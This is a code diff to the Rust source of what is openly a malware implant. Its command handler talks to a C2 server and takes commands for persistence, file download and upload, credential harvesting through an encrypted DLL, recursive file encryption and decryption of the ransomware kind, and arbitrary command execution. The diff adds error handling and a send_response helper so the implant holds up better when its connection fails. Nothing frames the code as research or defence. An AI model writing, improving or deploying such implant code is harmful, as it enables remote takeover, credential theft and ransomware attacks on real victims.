@@ -64,11 +64,23 @@ fn main() {
 }
 
 fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
-    let mut reader = BufReader::new(stream.try_clone().unwrap());
+    // Try to clone the stream, return early if it fails
+    let reader_stream = match stream.try_clone() {
+        Ok(s) => s,
+        Err(e) => {
+            debug_print!("DEBUG: Error cloning stream: {}", e);
+            return;
+        }
+    };
+    
+    let mut reader = BufReader::new(reader_stream);
     let mut writer = stream;
 
     // Enviar información del sistema de una vez (blocking)
-    send_sysinfo(&mut writer);
+    if !send_sysinfo(&mut writer) {
+        debug_print!("DEBUG: Error enviando información del sistema");
+        return;
+    }
 
     let mut buffer = String::new();
     loop {
@@ -83,21 +95,24 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
                     let method = command.strip_prefix("__PERSIST__:").unwrap_or("");
                     debug_print!("DEBUG: Estableciendo persistencia: {}", method);
                     let response = handle_persistence(method);
-                    writer.write_all(response.as_bytes()).ok();
-                    writer.flush().ok();
+                    if !send_response(&mut writer, &response) {
+                        break;
+                    }
                 } else if command == "__PERSIST_REMOVE__" {
                     // Comando para remover persistencia
                     debug_print!("DEBUG: Removiendo persistencia");
                     let response = handle_persistence_remove();
-                    writer.write_all(response.as_bytes()).ok();
-                    writer.flush().ok();
+                    if !send_response(&mut writer, &response) {
+                        break;
+                    }
                 } else if command.starts_with("__BEACON__:") {
                     // Comando para cambiar configuración de beacon: __BEACON__:60:30
                     let config_str = command.strip_prefix("__BEACON__:").unwrap_or("");
                     debug_print!("DEBUG: Cambiando configuración beacon: {}", config_str);
                     let response = format!("__INFO__:Configuración de beacon recibida (se aplicará en próxima reconexión): {}{}", config_str, DELIMITER);
-                    writer.write_all(response.as_bytes()).ok();
-                    writer.flush().ok();
+                    if !send_response(&mut writer, &response) {
+                        break;
+                    }
                     // Nota: la configuración real se aplicaría guardándola en un archivo
                     // pero para mantener simplicidad, solo informamos
                 } else if command.starts_with("__DOWNLOAD__:") {
@@ -105,39 +120,45 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
                     let path = command.strip_prefix("__DOWNLOAD__:").unwrap_or("");
                     debug_print!("DEBUG: Descargando archivo: {}", path);
                     let response = download_file(path);
-                    writer.write_all(response.as_bytes()).ok();
-                    writer.flush().ok();
+                    if !send_response(&mut writer, &response) {
+                        break;
+                    }
                 } else if command.starts_with("__UPLOAD__|") {
                     // Formato: __UPLOAD__|ruta_destino|datos_base64
                     debug_print!("DEBUG: Procesando upload...");
                     let response = upload_file(command);
-                    writer.write_all(response.as_bytes()).ok();
-                    writer.flush().ok();
+                    if !send_response(&mut writer, &response) {
+                        break;
+                    }
                 } else if command == "__HARVEST__" {
                     // Comando para robar credenciales usando DLL encriptada
                     debug_print!("DEBUG: Harvesting credenciales...");
                     let response = harvest_credentials();
-                    writer.write_all(response.as_bytes()).ok();
-                    writer.flush().ok();
+                    if !send_response(&mut writer, &response) {
+                        break;
+                    }
                 } else if command.starts_with("__ENCRYPT__:") {
                     // Comando para encriptar archivos: __ENCRYPT__:ruta|max_depth
                     let params = command.strip_prefix("__ENCRYPT__:").unwrap_or("");
                     debug_print!("DEBUG: Encrypting files: {}", params);
                     let response = encrypt_files(params);
-                    writer.write_all(response.as_bytes()).ok();
-                    writer.flush().ok();
+                    if !send_response(&mut writer, &response) {
+                        break;
+                    }
                 } else if command.starts_with("__DECRYPT__:") {
                     // Comando para desencriptar archivos: __DECRYPT__:ruta|key|max_depth
                     let params = command.strip_prefix("__DECRYPT__:").unwrap_or("");
                     debug_print!("DEBUG: Decrypting files: {}", params);
                     let response = decrypt_files(params);
-                    writer.write_all(response.as_bytes()).ok();
-                    writer.flush().ok();
+                    if !send_response(&mut writer, &response) {
+                        break;
+                    }
                 } else if !command.is_empty() {
                     let output = execute_command(command);
                     let response = format!("{}{}", output, DELIMITER);
-                    writer.write_all(response.as_bytes()).ok();
-                    writer.flush().ok();
+                    if !send_response(&mut writer, &response) {
+                        break;
+                    }
                 }
                 buffer.clear();
             }
@@ -146,7 +167,23 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
     }
 }
 
-fn send_sysinfo(writer: &mut TcpStream) {
+/// Helper function to send a response to the C2 server
+/// Returns false if the connection is broken (write or flush failed)
+fn send_response(writer: &mut TcpStream, response: &str) -> bool {
+    if let Err(e) = writer.write_all(response.as_bytes()) {
+        debug_print!("DEBUG: Error escribiendo respuesta: {}", e);
+        return false;
+    }
+    
+    if let Err(e) = writer.flush() {
+        debug_print!("DEBUG: Error flush respuesta: {}", e);
+        return false;
+    }
+    
+    true
+}
+
+fn send_sysinfo(writer: &mut TcpStream) -> bool {
     debug_print!("DEBUG: Recopilando información del sistema...");
     
     // Recopilar toda la información de una vez
@@ -162,9 +199,21 @@ fn send_sysinfo(writer: &mut TcpStream) {
     );
     
     debug_print!("DEBUG: Enviando información del sistema...");
-    writer.write_all(sysinfo.as_bytes()).ok();
-    writer.flush().ok();
-    debug_print!("DEBUG: Información enviada");
+    
+    // Check if write operation succeeds
+    if let Err(e) = writer.write_all(sysinfo.as_bytes()) {
+        debug_print!("DEBUG: Error escribiendo sysinfo: {}", e);
+        return false;
+    }
+    
+    // Check if flush operation succeeds
+    if let Err(e) = writer.flush() {
+        debug_print!("DEBUG: Error flush sysinfo: {}", e);
+        return false;
+    }
+    
+    debug_print!("DEBUG: Información enviada exitosamente");
+    true
 }
 
 fn get_system_info(info_type: &str) -> String {
